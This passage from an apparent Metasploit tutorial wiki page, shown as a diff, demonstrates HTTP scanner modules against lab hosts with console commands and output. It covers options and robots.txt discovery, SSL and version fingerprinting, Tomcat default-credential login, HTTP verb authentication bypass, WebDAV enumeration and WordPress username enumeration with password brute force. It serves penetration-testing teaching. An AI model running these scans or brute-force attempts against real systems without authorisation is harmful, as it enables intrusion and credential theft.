+<span style='color:#0000FF;'>[*]</span> Scanned 05 of 11 hosts (045% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 11 of 11 hosts (100% complete)
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>open_proxy</span>) ></pre>
+<br />
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="options"> options </span></h2>
+<p>The <b>"options"</b> scanner module connects to a given range of IP address and queries any web servers for the options that are available on them. Some of these options can be further leveraged to penetrated the system.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/scanner/http/options</span>
+msf auxiliary(<span style='color:#ff0000;'>options</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        Use a proxy chain
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    80               yes       The target port
+   THREADS  1                yes       The number of concurrent threads
+   VHOST                     no        HTTP server virtual host</pre>
+<br />
+We set our RHOSTS and THREADS value and let the scanner run.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>options</span>) > <span style='color:#13C16A;'>set RHOSTS 192.168.1.200-210</span>
+RHOSTS => 192.168.1.200-254
+msf auxiliary(<span style='color:#ff0000;'>options</span>) > <span style='color:#13C16A;'>set THREADS 11</span>
+THREADS => 11
+msf auxiliary(<span style='color:#ff0000;'>options</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> 192.168.1.203 allows OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK methods
+<span style='color:#0000FF;'>[*]</span> 192.168.1.204 allows OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK methods
+<span style='color:#0000FF;'>[*]</span> 192.168.1.205 allows OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK methods
+<span style='color:#0000FF;'>[*]</span> 192.168.1.206 allows OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK methods
+<span style='color:#0000FF;'>[*]</span> 192.168.1.208 allows GET,HEAD,POST,OPTIONS,TRACE methods
+<span style='color:#0000FF;'>[*]</span> 192.168.1.209 allows GET,HEAD,POST,OPTIONS,TRACE methods
+<span style='color:#0000FF;'>[*]</span> Scanned 55 of 55 hosts (100% complete)
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>options</span>) ></pre> 
+<br />
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="robots_txt"> robots_txt </span></h2>
+<p>The <b>"robots_txt"</b> auxiliary module scans a server or range of servers for the presence and contents of a robots.txt file. These files can frequently contain valuable information that administrators don't want search engines to discover.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/scanner/http/robots_txt</span>
+msf auxiliary(<span style='color:#ff0000;'>robots_txt</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   PATH     /                yes       The test path to find robots.txt file
+   Proxies                   no        Use a proxy chain
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    80               yes       The target port
+   THREADS  1                yes       The number of concurrent threads
+   VHOST                     no        HTTP server virtual host</pre>
+<br />
+The configuration for this module is minimal. We simply set the RHOSTS and THEADS values and let it go.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>robots_txt</span>) > <span style='color:#13C16A;'>set RHOSTS 192.168.1.200-254</span>
+RHOSTS => 192.168.1.200-254
+msf auxiliary(<span style='color:#ff0000;'>robots_txt</span>) > <span style='color:#13C16A;'>set THREADS 20</span>
+THREADS => 20
+msf auxiliary(<span style='color:#ff0000;'>robots_txt</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> [192.168.1.208] /robots.txt - /internal/, /tmp/
+<span style='color:#0000FF;'>[*]</span> [192.168.1.209] /robots.txt - /
+<span style='color:#0000FF;'>[*]</span> [192.168.1.211] /robots.txt - /
+<span style='color:#0000FF;'>[*]</span> Scanned 15 of 55 hosts (027% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 29 of 55 hosts (052% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 38 of 55 hosts (069% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 39 of 55 hosts (070% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 40 of 55 hosts (072% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 44 of 55 hosts (080% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 45 of 55 hosts (081% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 46 of 55 hosts (083% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 50 of 55 hosts (090% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 55 of 55 hosts (100% complete)
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>robots_txt</span>) ></pre>
+<br />
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="ssl"> ssl </span></h2>
+<p>The <b>"ssl"</b> module queries a host or range of hosts and pull the SSL certificate information if present.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/scanner/http/ss</span>l
+msf auxiliary(<span style='color:#ff0000;'>ssl</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    443              yes       The target port
+   THREADS  1                yes       The number of concurrent threads</pre>
+<br />
+To configure the module, we set our RHOSTS and THREADS values and let it run.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>ssl</span>) > <span style='color:#13C16A;'>set RHOSTS 192.168.1.200-254</span>
+RHOSTS => 192.168.1.200-254
+msf auxiliary(<span style='color:#ff0000;'>ssl</span>) > <span style='color:#13C16A;'>set THREADS 20</span>
+THREADS => 20
+msf auxiliary(<span style='color:#ff0000;'>ssl</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> Error: 192.168.1.205: OpenSSL::SSL::SSLError SSL_connect SYSCALL returned=5 errno=0 state=SSLv3 read server hello A
+<span style='color:#0000FF;'>[*]</span> Error: 192.168.1.206: OpenSSL::SSL::SSLError SSL_connect SYSCALL returned=5 errno=0 state=SSLv3 read server hello A
+<span style='color:#0000FF;'>[*]</span> 192.168.1.208:443 Subject: /C=--/ST=SomeState/L=SomeCity/O=SomeOrganization/OU=SomeOrganizationalUnit/CN=localhost.localdomain/emailAddress=root@localhost.localdomain Signature Alg: md5WithRSAEncryption
+<span style='color:#0000FF;'>[*]</span> 192.168.1.208:443 WARNING: Signature algorithm using MD5 (md5WithRSAEncryption)
+<span style='color:#0000FF;'>[*]</span> 192.168.1.208:443 has common name localhost.localdomain
+<span style='color:#0000FF;'>[*]</span> 192.168.1.211:443 Subject: /C=--/ST=SomeState/L=SomeCity/O=SomeOrganization/OU=SomeOrganizationalUnit/CN=localhost.localdomain/emailAddress=root@localhost.localdomain Signature Alg: sha1WithRSAEncryption
+<span style='color:#0000FF;'>[*]</span> 192.168.1.211:443 has common name localhost.localdomain
+<span style='color:#0000FF;'>[*]</span> Scanned 13 of 55 hosts (023% complete)
+<span style='color:#0000FF;'>[*]</span> Error: 192.168.1.227: OpenSSL::SSL::SSLError SSL_connect SYSCALL returned=5 errno=0 state=SSLv3 read server hello A
+<span style='color:#0000FF;'>[*]</span> 192.168.1.223:443 Subject: /CN=localhost Signature Alg: sha1WithRSAEncryption
+<span style='color:#0000FF;'>[*]</span> 192.168.1.223:443 has common name localhost
+<span style='color:#0000FF;'>[*]</span> 192.168.1.222:443 WARNING: Signature algorithm using MD5 (md5WithRSAEncryption)
+<span style='color:#0000FF;'>[*]</span> 192.168.1.222:443 has common name MAILMAN
+<span style='color:#0000FF;'>[*]</span> Scanned 30 of 55 hosts (054% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 31 of 55 hosts (056% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 39 of 55 hosts (070% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 41 of 55 hosts (074% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 43 of 55 hosts (078% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 45 of 55 hosts (081% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 46 of 55 hosts (083% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 53 of 55 hosts (096% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 55 of 55 hosts (100% complete)
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>ssl</span>) ></pre>
+<br />
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="http_version"> http_version </span></h2>
+<p>The <b>"http_version"</b> scanner will scan a range of hosts and determine the web server version that is running on them.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/scanner/http/http_version</span>
+msf auxiliary(<span style='color:#ff0000;'>http_version</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        Use a proxy chain
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    80               yes       The target port
+   THREADS  1                yes       The number of concurrent threads
+   VHOST                     no        HTTP server virtual host</pre>
+<br />
+To run the scan, we set the RHOSTS and THREADS values and let it run.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>http_version</span>) > <span style='color:#13C16A;'>set RHOSTS 192.168.1.0/24</span>
+RHOSTS => 192.168.1.0/24
+msf auxiliary(<span style='color:#ff0000;'>http_version</span>) > <span style='color:#13C16A;'>set THREADS 255</span>
+THREADS => 255
+msf auxiliary(<span style='color:#ff0000;'>http_version</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> 192.168.1.2 Web Server
+<span style='color:#0000FF;'>[*]</span> 192.168.1.1 Apache ( 302-https://192.168.1.1:10443/ )
+<span style='color:#0000FF;'>[*]</span> 192.168.1.11 
+<span style='color:#0000FF;'>[*]</span> Scanned 080 of 256 hosts (031% complete)
+<span style='color:#0000FF;'>[*]</span> 192.168.1.101 Apache/2.2.9 (Ubuntu) PHP/5.2.6-bt0 with Suhosin-Patch
+<span style='color:#00ff00;'>...snip...</span>
+<span style='color:#0000FF;'>[*]</span> 192.168.1.250 lighttpd/1.4.26 ( 302-http://192.168.1.250/account/login/?next=/ )
+<span style='color:#0000FF;'>[*]</span> Scanned 198 of 256 hosts (077% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 214 of 256 hosts (083% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 248 of 256 hosts (096% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 253 of 256 hosts (098% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 256 of 256 hosts (100% complete)
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>http_version</span>) ></pre> 
+<br />
+Armed with the knowledge of the target web server software, attacks can be specifically tailored to suit the target.
+<br />
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="tomcat_mgr_login"> tomcat_mgr_login </span></h2>
+<p>The <b>"tomcat_mgr_login"</b> auxiliary module simply attempts to login to a Tomcat Manager Application instance using a provided username and password list.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/scanner/http/tomcat_mgr_login</span>
+msf auxiliary(<span style='color:#ff0000;'>tomcat_mgr_login</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options (auxiliary/scanner/http/tomcat_mgr_login):
+
+   Name              Current Setting                                                       Required  Description
+   ----              ---------------                                                       --------  -----------
+   BLANK_PASSWORDS   true                                                                  yes       Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                                     yes       How fast to bruteforce, from 0 to 5
+   PASSWORD                                                                                no        A specific password to authenticate with
+   PASS_FILE         /opt/metasploit3/msf3/data/wordlists/tomcat_mgr_default_pass.txt      no        File containing passwords, one per line
+   Proxies                                                                                 no        Use a proxy chain
+   RHOSTS                                                                                  yes       The target address range or CIDR identifier
+   RPORT             8080                                                                  yes       The target port
+   STOP_ON_SUCCESS   false                                                                 yes       Stop guessing when a credential works for a host
+   THREADS           1                                                                     yes       The number of concurrent threads
+   USERNAME                                                                                no        A specific username to authenticate as
+   USERPASS_FILE     /opt/metasploit3/msf3/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
+   USER_FILE         /opt/metasploit3/msf3/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, one per line
+   UserAgent         Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)                    yes       The HTTP User-Agent sent in the request
+   VERBOSE           true                                                                  yes       Whether to print output for all attempts
+   VHOST                                                                                   no        HTTP server virtual host</pre>
+<br />
+We will keep the default username and password files, set our RHOSTS and the RPORT of our target and let it run.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>tomcat_mgr_login</span>) > <span style='color:#13C16A;'>set RHOSTS 192.168.1.208</span>
+RHOSTS => 192.168.1.208
+msf auxiliary(<span style='color:#ff0000;'>tomcat_mgr_login</span>) > <span style='color:#13C16A;'>set RPORT 8180</span> 
+RPORT => 8180
+msf auxiliary(<span style='color:#ff0000;'>tomcat_mgr_login</span>) > <span style='color:#13C16A;'>set VERBOSE false</span> 
+VERBOSE => false
+msf auxiliary(<span style='color:#ff0000;'>tomcat_mgr_login</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#00ff00;'>[+]</span> http://192.168.1.208:8180/manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] successful login 'tomcat' : 'tomcat'
+<span style='color:#0000FF;'>[*]</span> Scanned 1 of 1 hosts (100% complete)
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>tomcat_mgr_login</span>) ></pre>
+<br />
+Our quick scan turned up a default set of tomcat credentials on our target system.
+<br />
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="verb_auth_bypass"> verb_auth_bypass </span></h2>
+<p>The <b>"verb_auth_bypass"</b> module scans a server or range of servers and attempts to bypass authentication by using different HTTP verbs.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/scanner/http/verb_auth_bypass</span>
+msf auxiliary(<span style='color:#ff0000;'>verb_auth_bypass</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options (auxiliary/scanner/http/verb_auth_bypass):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   PATH     /                yes       The path to test
+   Proxies                   no        Use a proxy chain
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    80               yes       The target port
+   THREADS  1                yes       The number of concurrent threads
+   VHOST                     no        HTTP server virtual host</pre>
+<br />
+We configure this module by setting the path to the page requiring authentication, set our RHOSTS value and let the scanner run.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>verb_auth_bypass</span>) > <span style='color:#13C16A;'>set PATH /xampp/</span>
+PATH => /xampp/
+msf auxiliary(<span style='color:#ff0000;'>verb_auth_bypass</span>) > <span style='color:#13C16A;'>set RHOSTS 192.168.1.201</span>
+RHOSTS => 192.168.1.201
+msf auxiliary(<span style='color:#ff0000;'>verb_auth_bypass</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> 192.168.1.201 requires authentication: Basic realm="xampp user" [401]
+<span style='color:#0000FF;'>[*]</span> Testing verb HEAD resp code: [401]
+<span style='color:#0000FF;'>[*]</span> Testing verb TRACE resp code: [200]
+<span style='color:#0000FF;'>[*]</span> Possible authentication bypass with verb TRACE code 200
+<span style='color:#0000FF;'>[*]</span> Testing verb TRACK resp code: [401]
+<span style='color:#0000FF;'>[*]</span> Testing verb WMAP resp code: [401]
+<span style='color:#0000FF;'>[*]</span> Scanned 1 of 1 hosts (100% complete)
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>verb_auth_bypass</span>) ></pre> 
+<br />
+By reading the returned server status codes, the module indicates there is a potential auth bypass by using the TRACE verb on our target.
+<br />
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="webdav_scanner"> webdav_scanner </span></h2>
+<p>The <b>"webdav_scanner"</b> module scans a server or range of servers and attempts to determine if WebDav is enabled. This allows us to better fine-tune our attacks.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/scanner/http/webdav_scanner</span>
+msf auxiliary(<span style='color:#ff0000;'>webdav_scanner</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options (auxiliary/scanner/http/webdav_scanner):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        Use a proxy chain
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    80               yes       The target port
+   THREADS  1                yes       The number of concurrent threads
+   VHOST                     no        HTTP server virtual host</pre>
+<br />
+The only configuration we need to do is to set our RHOSTS and THREADS values and let the scanner run.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>webdav_scanner</span>) > <span style='color:#13C16A;'>set RHOSTS 192.168.1.200-250</span>
+RHOSTS => 192.168.1.200-250
+msf auxiliary(<span style='color:#ff0000;'>webdav_scanner</span>) > <span style='color:#13C16A;'>set THREADS 20</span>
+THREADS => 20
+msf auxiliary(<span style='color:#ff0000;'>webdav_scanner</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> 192.168.1.203 (Microsoft-IIS/5.1) has WEBDAV ENABLED
+<span style='color:#0000FF;'>[*]</span> 192.168.1.209 (Apache/2.0.54 (Linux/SUSE)) WebDAV disabled.
+<span style='color:#0000FF;'>[*]</span> 192.168.1.208 (Apache/2.0.52 (CentOS)) WebDAV disabled.
+<span style='color:#0000FF;'>[*]</span> 192.168.1.213 (Apache/2.2.14 (Ubuntu)) WebDAV disabled.
+<span style='color:#0000FF;'>[*]</span> Scanned 14 of 51 hosts (027% complete)
+<span style='color:#0000FF;'>[*]</span> 192.168.1.222 (Apache/1.3.23 (Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.7 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2) WebDAV disabled.
+<span style='color:#0000FF;'>[*]</span> 192.168.1.223 (Apache/2.2.14 (Win32) DAV/2 mod_ssl/2.2.14 OpenSSL/0.9.8l mod_autoindex_color PHP/5.3.1 mod_apreq2-20090110/2.7.1 mod_perl/2.0.4 Perl/v5.10.1) WebDAV disabled.
+<span style='color:#0000FF;'>[*]</span> 192.168.1.229 (Microsoft-IIS/6.0) has WEBDAV ENABLED
+<span style='color:#0000FF;'>[*]</span> 192.168.1.224 (Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6) WebDAV disabled.
+<span style='color:#0000FF;'>[*]</span> 192.168.1.227 (Microsoft-IIS/5.0) has WEBDAV ENABLED
+<span style='color:#0000FF;'>[*]</span> Scanned 28 of 51 hosts (054% complete)
+<span style='color:#0000FF;'>[*]</span> 192.168.1.234 (lighttpd/1.4.25) WebDAV disabled.
+<span style='color:#0000FF;'>[*]</span> 192.168.1.235 (Apache/2.2.3 (CentOS)) WebDAV disabled.
+<span style='color:#0000FF;'>[*]</span> Scanned 38 of 51 hosts (074% complete)
+<span style='color:#0000FF;'>[*]</span> Scanned 51 of 51 hosts (100% complete)
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>webdav_scanner</span>) ></pre> 
+<br />
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="webdav_website_content"> webdav_website_content </span></h2>
+<p>The <b>"webdav_website_content"</b> auxiliary module scans a host or range of hosts for servers that disclose their content via WebDav.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/scanner/http/webdav_website_content</span>
+msf auxiliary(<span style='color:#ff0000;'>webdav_website_content</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options (auxiliary/scanner/http/webdav_website_content):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        Use a proxy chain
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    80               yes       The target port
+   THREADS  1                yes       The number of concurrent threads
+   VHOST                     no        HTTP server virtual host</pre>
+<br />
+As this module can produce a lot of output, we will set RHOSTS to target a single machine and let it run.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>webdav_website_content</span>) > <span style='color:#13C16A;'>set RHOSTS 192.168.1.201</span>
+RHOSTS => 192.168.1.201
+msf auxiliary(<span style='color:#ff0000;'>webdav_website_content</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/aspnet_client/
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/images/
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_private/
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_cnf/
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_cnf/iisstart.htm
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_cnf/pagerror.gif
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_log/
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/access.cnf
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/botinfs.cnf
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/bots.cnf
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/deptodoc.btr
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/doctodep.btr
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/frontpg.lck
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/linkinfo.btr
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/service.cnf
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/service.lck
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/services.cnf
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/svcacl.cnf
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/uniqperm.cnf
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_pvt/writeto.cnf
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_script/
+<span style='color:#0000FF;'>[*]</span> Found file or directory in WebDAV response (192.168.1.201) http://192.168.1.201/_vti_txt/
+<span style='color:#0000FF;'>[*]</span> Scanned 1 of 1 hosts (100% complete)
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>webdav_website_content</span>) ></pre>
+<br />
+<br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="wordpress_login_enum"> wordpress_login_enum </span></h2>
+<p>The <b>"wordpress_login_enum"</b> auxiliary module will brute-force a WordPress installation and first determine valid usernames and then perform a password-guessing attack.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use auxiliary/scanner/http/wordpress_login_enum</span>
+msf auxiliary(<span style='color:#ff0000;'>wordpress_login_enum</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options (auxiliary/scanner/http/wordpress_login_enum):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   BLANK_PASSWORDS   true             yes       Try blank passwords for all users
+   BRUTEFORCE        true             yes       Perform brute force authentication
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+   PASSWORD                           no        A specific password to authenticate with
+   PASS_FILE                          no        File containing passwords, one per line
+   Proxies                            no        Use a proxy chain
+   RHOSTS                             yes       The target address range or CIDR identifier
+   RPORT             80               yes       The target port
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
+   THREADS           1                yes       The number of concurrent threads
+   URI               /wp-login.php    no        Define the path to the wp-login.php file
+   USERNAME                           no        A specific username to authenticate as
+   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
+   USER_FILE                          no        File containing usernames, one per line
+   VALIDATE_USERS    true             yes       Enumerate usernames
+   VERBOSE           true             yes       Whether to print output for all attempts
+   VHOST                              no        HTTP server virtual host</pre>
+<br />
+We configure the module first by pointing it to the path of wp-login.php on the target server. We then set our username and password files, set the RHOSTS value, and let it run.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>wordpress_login_enum</span>) > <span style='color:#13C16A;'>set URI /wordpress/wp-login.php</span>
+URI => /wordpress/wp-login.php
+msf auxiliary(<span style='color:#ff0000;'>wordpress_login_enum</span>) > <span style='color:#13C16A;'>set PASS_FILE /tmp/passes.txt</span>
+PASS_FILE => /tmp/passes.txt
+msf auxiliary(<span style='color:#ff0000;'>wordpress_login_enum</span>) > <span style='color:#13C16A;'>set USER_FILE /tmp/users.txt</span>
+USER_FILE => /tmp/users.txt
+msf auxiliary(<span style='color:#ff0000;'>wordpress_login_enum</span>) > <span style='color:#13C16A;'>set RHOSTS 192.168.1.201</span>
+RHOSTS => 192.168.1.201
+msf auxiliary(<span style='color:#ff0000;'>wordpress_login_enum</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Running User Enumeration
+<span style='color:#0000FF;'>[*]</span> http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Checking Username:'administrator'
+<span style='color:#ff0000;'>[-]</span> http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Invalid Username: 'administrator'
+<span style='color:#0000FF;'>[*]</span> http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Checking Username:'admin'
+<span style='color:#00ff00;'>[+]</span> http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration- Username: 'admin' - is VALID
+<span style='color:#0000FF;'>[*]</span> http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Checking Username:'root'
+<span style='color:#ff0000;'>[-]</span> http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Invalid Username: 'root'
+<span style='color:#0000FF;'>[*]</span> http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Checking Username:'god'
+<span style='color:#ff0000;'>[-]</span> http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Invalid Username: 'god'
+<span style='color:#00ff00;'>[+]</span> http://192.168.1.201:80/wordpress/wp-login.php - WordPress Enumeration - Found 1 valid user
+<span style='color:#0000FF;'>[*]</span> http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Running Bruteforce
+<span style='color:#0000FF;'>[*]</span> http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Skipping all but 1 valid user
+<span style='color:#0000FF;'>[*]</span> http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Trying username:'admin' with password:''
+<span style='color:#ff0000;'>[-]</span> http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Failed to login as 'admin'
+<span style='color:#0000FF;'>[*]</span> http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Trying username:'admin' with password:'root'
+<span style='color:#ff0000;'>[-]</span> http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Failed to login as 'admin'
+<span style='color:#0000FF;'>[*]</span> http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Trying username:'admin' with password:'admin'
+<span style='color:#ff0000;'>[-]</span> http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Failed to login as 'admin'
+<span style='color:#0000FF;'>[*]</span> http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Trying username:'admin' with password:'god'
